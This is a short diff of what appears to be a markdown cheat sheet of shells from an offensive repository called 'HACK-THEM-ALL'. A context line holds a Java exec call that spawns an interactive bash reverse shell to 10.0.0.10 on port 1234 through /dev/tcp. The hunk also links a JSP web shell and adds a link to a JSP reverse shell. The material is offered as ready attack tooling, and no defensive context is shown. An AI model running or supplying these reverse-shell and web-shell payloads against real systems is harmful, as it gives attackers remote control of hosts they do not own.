@@ -14,3 +14,5 @@ exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");
 
 [JSP simple web shell](https://github.com/k2haxor/HACK-THEM-ALL/blob/master/shells/shell.jsp)
 
+[JSP reverse shell](https://github.com/k2haxor/HACK-THEM-ALL/blob/master/shells/reverse_shell.jsp)
+
